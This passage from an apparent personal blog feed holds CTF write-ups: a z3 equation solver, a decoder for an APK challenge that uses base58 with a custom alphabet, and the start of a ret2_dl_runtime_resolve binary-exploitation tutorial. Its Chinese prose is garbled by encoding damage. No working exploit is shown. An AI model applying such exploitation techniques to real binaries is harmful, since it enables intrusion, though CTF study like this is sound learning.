class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx = Context()</span><br><span class="line"></span><br><span class="line">l = [Int(<span class="string">f&quot;l<span class="subst">&#123;i&#125;</span>&quot;</span>, ctx=ctx) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>)]</span><br><span class="line"></span><br><span class="line">eq1 = (<span class="number">593</span>*l[<span class="number">0</span>] + <span class="number">997</span>*l[<span class="number">1</span>] + <span class="number">811</span>*l[<span class="number">2</span>] + <span class="number">258</span>*l[<span class="number">3</span>] + <span class="number">829</span>*l[<span class="number">4</span>] + <span class="number">532</span>*l[<span class="number">5</span>]) == <span class="number">0x5b8e0aef71d34ff43</span></span><br><span class="line">eq2 = (<span class="number">605</span>*l[<span class="number">0</span>] + <span class="number">686</span>*l[<span class="number">1</span>] + <span class="number">328</span>*l[<span class="number">2</span>] + <span class="number">602</span>*l[<span class="number">3</span>] + <span class="number">695</span>*l[<span class="number">4</span>] + <span class="number">576</span>*l[<span class="number">5</span>]) == <span class="number">0x551a262360964ef7f</span></span><br><span class="line">eq3 = (<span class="number">373</span>*l[<span class="number">0</span>] + <span class="number">512</span>*l[<span class="number">1</span>] + <span class="number">449</span>*l[<span class="number">2</span>] + <span class="number">756</span>*l[<span class="number">3</span>] + <span class="number">448</span>*l[<span class="number">4</span>] + <span class="number">580</span>*l[<span class="number">5</span>]) == <span class="number">0x49d158a5657d6931c</span></span><br><span class="line">eq4 = (<span class="number">560</span>*l[<span class="number">0</span>] + <span class="number">635</span>*l[<span class="number">1</span>] + <span class="number">422</span>*l[<span class="number">2</span>] + <span class="number">971</span>*l[<span class="number">3</span>] + <span class="number">855</span>*l[<span class="number">4</span>] + <span class="number">597</span>*l[<span class="number">5</span>]) == <span class="number">0x625568d5abbabf4f3</span></span><br><span class="line">eq5 = (<span class="number">717</span>*l[<span class="number">0</span>] + <span class="number">507</span>*l[<span class="number">1</span>] + <span class="number">388</span>*l[<span class="number">2</span>] + <span class="number">925</span>*l[<span class="number">3</span>] + <span class="number">324</span>*l[<span class="number">4</span>] + <span class="number">524</span>*l[<span class="number">5</span>]) == <span class="number">0x50ee0c025e70e3c23</span></span><br><span class="line">eq6 = (<span class="number">312</span>*l[<span class="number">0</span>] + <span class="number">368</span>*l[<span class="number">1</span>] + <span class="number">884</span>*l[<span class="number">2</span>] + <span class="number">518</span>*l[<span class="number">3</span>] + <span class="number">495</span>*l[<span class="number">4</span>] + <span class="number">414</span>*l[<span class="number">5</span>]) == <span class="number">0x40e735f8aa2815f65</span></span><br><span class="line"></span><br><span class="line">solver = Solver(ctx=ctx)</span><br><span class="line"></span><br><span class="line">solver.add(eq1, eq2, eq3, eq4, eq5, eq6)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line"></span><br><span class="line">    model = solver.model()</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;l<span class="subst">&#123;i&#125;</span> = <span class="subst">&#123;model[l[i]]&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ— è§£&quot;</span>)</span><br><span class="line">l_values = [</span><br><span class="line">    <span class="number">28829613228248624</span>,</span><br><span class="line">    <span class="number">26827458353261422</span>,</span><br><span class="line">    <span class="number">13642136288051316</span>,</span><br><span class="line">    <span class="number">29378135513658469</span>,</span><br><span class="line">    <span class="number">32192963475959391</span>,</span><br><span class="line">    <span class="number">30791965425607037</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> l_values:</span><br><span class="line">    <span class="keyword">while</span> val &gt; <span class="number">0</span>:</span><br><span class="line">        byte = val &amp; <span class="number">0xFF</span>  <span class="comment"># å–æœ€ä½8ä½</span></span><br><span class="line">        result = <span class="built_in">chr</span>(byte) + result  </span><br><span class="line">        val &gt;&gt;= <span class="number">8</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result =result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">l_values = [</span><br><span class="line">    <span class="number">28829613228248624</span>,</span><br><span class="line">    <span class="number">26827458353261422</span>,</span><br><span class="line">    <span class="number">13642136288051316</span>,</span><br><span class="line">    <span class="number">29378135513658469</span>,</span><br><span class="line">    <span class="number">32192963475959391</span>,</span><br><span class="line">    <span class="number">30791965425607037</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char_lists = []</span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> l_values:</span><br><span class="line">    char_list = []</span><br><span class="line">    <span class="keyword">while</span> val &gt; <span class="number">0</span>:</span><br><span class="line">        byte = val &amp; <span class="number">0xFF</span></span><br><span class="line">        char_list.insert(<span class="number">0</span>, <span class="built_in">chr</span>(byte)) </span><br><span class="line">        val &gt;&gt;= <span class="number">8</span></span><br><span class="line">    char_lists.append(char_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sorted_char_lists = <span class="built_in">sorted</span>(<span class="built_in">enumerate</span>(char_lists), key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join(char_list) <span class="keyword">for</span> _, char_list <span class="keyword">in</span> sorted_char_lists])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ezzzapk-xxxxé™„ä»¶å"><a href="#ezzzapk-xxxxé™„ä»¶å" class="headerlink" title="ezzzapk xxxxé™„ä»¶å"></a>ezzzapk xxxxé™„ä»¶å</h3><p>æ­¤é¢˜ç”¨jeb å»çœ‹ä¼ªä»£ç ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span>  <span class="comment">// androidx.fragment.app.FragmentActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F0B001C</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        <span class="built_in">this</span>.flag = (TextView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0800C0</span>);  <span class="comment">// id:flag</span></span><br><span class="line">        <span class="built_in">this</span>.input_1 = (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0800DF</span>);  <span class="comment">// id:input_1</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">v1</span> <span class="operator">=</span> (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F080062</span>);  <span class="comment">// id:button</span></span><br><span class="line">        <span class="built_in">this</span>.button = v1;</span><br><span class="line">        v1.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> encrypt.encode(MainActivity.<span class="built_in">this</span>.input_1.getText().toString().getBytes(StandardCharsets.UTF_8));</span><br><span class="line">                <span class="keyword">if</span>(<span class="string">&quot;5TAYhycAPT1aAd535TGdWYQ8CvfoRjErGEreqhDpqv1LydTqd3mxuK2hhUp9Pws3u9mq6eX&quot;</span>.equals(str3)) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplication(), <span class="string">&quot;flagæ­£ç¡®&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplication(), <span class="string">&quot;flagé”™è¯¯ï¼Œå†å»æ’…ä¸€ä¼š&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>encrypt.encodeï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.shenghuo2.ctf.ez_apk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">encrypt</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span>[] ALPHABET;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span> ENCODED_ZERO;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span>[] INDEXES;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] v0 = <span class="string">&quot;9LfnoVpi1HrzBSKxhNFeyY745R2g3QmqsTCZJuDvcMdkE8wPGbUXajtAW6&quot;</span>.toCharArray();</span><br><span class="line">        encrypt.ALPHABET = v0;</span><br><span class="line">        encrypt.ENCODED_ZERO = v0[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span>[] v0_1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0x80</span>];</span><br><span class="line">        encrypt.INDEXES = v0_1;</span><br><span class="line">        Arrays.fill(v0_1, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; <span class="literal">true</span>; ++i) &#123;</span><br><span class="line">            <span class="type">char</span>[] v1 = encrypt.ALPHABET;</span><br><span class="line">            <span class="keyword">if</span>(i &gt;= v1.length) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            encrypt.INDEXES[v1[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span> <span class="title function_">divmod</span><span class="params">(<span class="type">byte</span>[] arg5, <span class="type">int</span> arg6, <span class="type">int</span> arg7, <span class="type">int</span> arg8)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">remainder</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = arg6; i &lt; arg5.length; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> remainder * arg7 + (arg5[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">            arg5[i] = (<span class="type">byte</span>)(temp / arg8);</span><br><span class="line">            remainder = temp % arg8;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="type">byte</span>)remainder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encode</span><span class="params">(<span class="type">byte</span>[] arg7)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(arg7.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> zeros;</span><br><span class="line">        <span class="keyword">for</span>(zeros = <span class="number">0</span>; zeros &lt; arg7.length &amp;&amp; arg7[zeros] == <span class="number">0</span>; ++zeros) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] v7 = Arrays.copyOf(arg7, arg7.length);</span><br><span class="line">        <span class="type">char</span>[] encoded = <span class="keyword">new</span> <span class="title class_">char</span>[v7.length * <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">outputStart</span> <span class="operator">=</span> encoded.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">inputStart</span> <span class="operator">=</span> zeros;</span><br><span class="line">        <span class="keyword">while</span>(inputStart &lt; v7.length) &#123;</span><br><span class="line">            --outputStart;</span><br><span class="line">            encoded[outputStart] = encrypt.ALPHABET[encrypt.divmod(v7, inputStart, <span class="number">0x100</span>, <span class="number">58</span>)];</span><br><span class="line">            <span class="keyword">if</span>(v7[inputStart] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++inputStart;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(outputStart &lt; encoded.length &amp;&amp; encoded[outputStart] == encrypt.ENCODED_ZERO) &#123;</span><br><span class="line">            ++outputStart;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            --zeros;</span><br><span class="line">            <span class="keyword">if</span>(zeros &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            --outputStart;</span><br><span class="line">            encoded[outputStart] = encrypt.ENCODED_ZERO;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(encoded, outputStart, encoded.length - outputStart);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹ä¼ªä»£ç ï¼Œå‘ç°å°±æ˜¯ä¸€ä¸ªbase58ï¼Œåªä¸è¿‡æ¢è¡¨äº†ï¼Œè·Ÿbase64æ¢ç (biao)ä¸€ä¸ªé“ç†ï¼Œç›´æ¥å†™è„šæœ¬æ¢ä¸‹å³å¯</p><p>exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">BASE58_ALPHABET = <span class="string">&quot;9LfnoVpi1HrzBSKxhNFeyY745R2g3QmqsTCZJuDvcMdkE8wPGbUXajtAW6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base58_decode</span>(<span class="params">cipher_input</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#  æ£€æŸ¥å¯†æ–‡å­—ç¬¦çš„æœ‰æ•ˆæ€§ï¼Œå¯†æ–‡å­—ç¬¦å¿…é¡»æ˜¯base58ä¸­çš„å­—ç¬¦ï¼Œå¦åˆ™è¿”å›æç¤º</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> cipher_input:</span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> BASE58_ALPHABET:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;ä¸æ˜¯æœ‰æ•ˆçš„Base58ç¼–ç ï¼Œè¯·ä»”ç»†æ£€æŸ¥å­—ç¬¦ï¼š&#x27;</span> + item</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å°†Base58ç¼–ç çš„å­—ç¬¦è½¬æ¢ä¸ºBase10æ•°å­—</span></span><br><span class="line">        decoded_value = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> cipher_input:</span><br><span class="line">            decoded_value = decoded_value * <span class="number">58</span> + BASE58_ALPHABET.index(char)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å°†Base10æ•°å­—è½¬æ¢ä¸ºå­—èŠ‚ä¸²</span></span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">while</span> decoded_value &gt; <span class="number">0</span>:</span><br><span class="line">            decoded_value, remainder = <span class="built_in">divmod</span>(decoded_value, <span class="number">256</span>)</span><br><span class="line">            result.insert(<span class="number">0</span>, remainder)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base58_encode</span>(<span class="params">string_input</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚ä¸²</span></span><br><span class="line">        string_bytes = string_input.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å°†å­—èŠ‚ä¸²è½¬æ¢ä¸ºBase10æ•°å­—</span></span><br><span class="line">        string_decimal = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> string_bytes:</span><br><span class="line">            string_decimal = string_decimal * <span class="number">256</span> + byte</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å°†Base10æ•°å­—è½¬æ¢ä¸ºBase58ç¼–ç çš„å­—ç¬¦ä¸²</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> string_decimal &gt; <span class="number">0</span>:</span><br><span class="line">            string_decimal, remainder = <span class="built_in">divmod</span>(string_decimal, <span class="number">58</span>)</span><br><span class="line">            result = BASE58_ALPHABET[remainder] + result</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æµ‹è¯•è§£ç </span></span><br><span class="line">encoded_str = <span class="string">&quot;5TAYhycAPT1aAd535TGdWYQ8CvfoRjErGEreqhDpqv1LydTqd3mxuK2hhUp9Pws3u9mq6eX&quot;</span></span><br><span class="line">decoded_str = base58_decode(encoded_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded String:&quot;</span>, decoded_str)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šå•¥ä¹Ÿæ²¡æœ‰ï¼Œå°±æ˜¯å¾ˆå¼€æ‘†â€¦â€¦â€¦â€¦..,ä»¥åå°±ä¸å¸¸å†™æ–‡ç« äº†ï¼Œæ¯•ç«Ÿè¦å‡†å¤‡è€ƒè¯•www</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;å…³äºxxxxæ¯”èµ›xxxå­¦å¼Ÿxxxxæ—¶é—´ç»™äº†xxxxä¸¤ä¸ªé“reé¢˜ï¼ŒğŸ‘´å¼€äº†ä¸‹é¢˜ä¸éš¾ï¼Œå°±æ˜¯å†™è„šæœ¬è€æ˜¯æŠ¥é”™ï¼Œg&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è¿™ä¸¤å¤©å­¦å¼Ÿç»™äº†ä¸¤é“Revé¢˜ï¼Œé‡æ¸©ä¸‹å½“å¹´çš„reå‘³é“ï¼Œreéƒ½ä¸éš¾ï¼Œéšä¾¿æ°´ä¸€ä¸ªåšå®¢æ–‡ç« ï¼ˆæ¯•ç«Ÿåšå®¢åˆšåˆ›å»ºæ²¡å¤šä¹…ï¼Œ</summary>
      
    
    
    
    <category term="Reverse" scheme="https://jsjsj.top/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://jsjsj.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>ret2_dl_runtime_resolve</title>
    <link href="https://jsjsj.top/2023/10/03/ret2-dl-runtime-resolve/"/>
    <id>https://jsjsj.top/2023/10/03/ret2-dl-runtime-resolve/</id>
    <published>2023-10-03T14:07:17.000Z</published>
    <updated>2023-10-03T14:30:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2-dl-runtime-resolve-x86-x64"><a href="#ret2-dl-runtime-resolve-x86-x64" class="headerlink" title="ret2_dl_runtime_resolve(x86&#x2F;x64)"></a>ret2_dl_runtime_resolve(x86&#x2F;x64)</h1><h2 id="First-record-the-method-link-map-of-ret2-dl-runtime-resolve-of-x64"><a href="#First-record-the-method-link-map-of-ret2-dl-runtime-resolve-of-x64" class="headerlink" title="First record the method link_map of ret2_dl_runtime_resolve of x64"></a>First record the method link_map of ret2_dl_runtime_resolve of x64</h2><p>I think ret2dl is very difficult, very difficult, really difficult, woo woo<br>link_map I think it is like the iofile on the stack, that is, link_map. Letâ€™s analyze the source code.</p><p>Before analyzing the previous source code, letâ€™s look at a few structures:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Relï¼š</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addrr_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Wordr_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">Elf64_Relï¼š</span><br><span class="line"><span class="keyword">typedef</span> structc</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Addrr_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xwordr_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure><p>The above is the relocation function structure,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Wordst_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addrst_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Wordst_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Sectionst_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span>c</span><br><span class="line">  Elf64_Wordst_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Sectionst_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addrst_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xwordst_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>The above is the symtable structure, which is precisely located by the r_info of the previous relocation function structure</p><p>In fact, these can be faked in linkmap, letâ€™s look at the structure of linkmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *l</span><br><span class="line">$<span 